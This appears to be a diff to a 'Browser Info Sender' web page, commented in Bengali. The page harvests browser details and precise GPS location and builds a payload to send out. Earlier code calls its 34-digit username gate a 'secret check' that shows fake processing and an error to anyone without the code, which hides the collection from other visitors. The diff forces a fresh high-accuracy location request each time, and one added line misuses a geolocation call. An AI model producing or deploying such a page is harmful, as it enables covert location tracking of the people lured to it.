@@ -6,6 +6,7 @@
   <title>Browser Info Sender</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   <style>
+    /* আগের সব CSS একই রাখা হয়েছে, কোনো চেঞ্জ নাই */
     :root {
       --bg: #0a001a;
       --card: rgba(20, 20, 40, 0.75);
@@ -165,7 +166,7 @@
     async function sendBrowserInfo() {
       const username = usernameInput.value.trim();
 
-      // Secret check: ঠিক 34 ডিজিট না হলে fake processing + error
+      // 34 ডিজিট চেক
       if (username.length !== 34) {
         sendBtn.disabled = true;
         status.textContent = "Processing...";
@@ -177,7 +178,6 @@
         return;
       }
 
-      // 34 ডিজিট হলে আসল প্রসেস শুরু
       sendBtn.disabled = true;
       sendBtn.textContent = "Collecting & Sending...";
       status.textContent = "Collecting browser info...";
@@ -206,14 +206,24 @@
         let geo = "Location permission denied or error";
         let mapLink = "";
 
+        // প্রতিবার নতুন করে permission চাওয়ার জন্য
         try {
           const position = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-              enableHighAccuracy: true,
-              timeout: 20000,
-              maximumAge: 0
-            });
+            // maximumAge: 0 দিয়ে cache disable
+            const watchId = navigator.geolocation.getCurrentPosition(
+              (pos) => {
+                navigator.geolocation.clearWatch(watchId); // immediate clear
+                resolve(pos);
+              },
+              reject,
+              {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0  // cache না নেয়ার জন্য
+              }
+            );
           });
+
           const lat = position.coords.latitude.toFixed(6);
           const lon = position.coords.longitude.toFixed(6);
           const acc = position.coords.accuracy.toFixed(0);
@@ -221,12 +231,11 @@
           mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
           status.textContent = "Location captured → Sending...";
         } catch (geoErr) {
-          // Permission না দিলে বা error হলে fail করবে
           status.textContent = "Failed: Location permission required";
           sendBtn.disabled = false;
           sendBtn.textContent = "Submit Username & Send My Data";
           console.error("Geolocation failed:", geoErr);
-          return; // এখান থেকে return → কোনো data পাঠাবে না
+          return; // permission না দিলে send stop
         }
 
         const payload = {
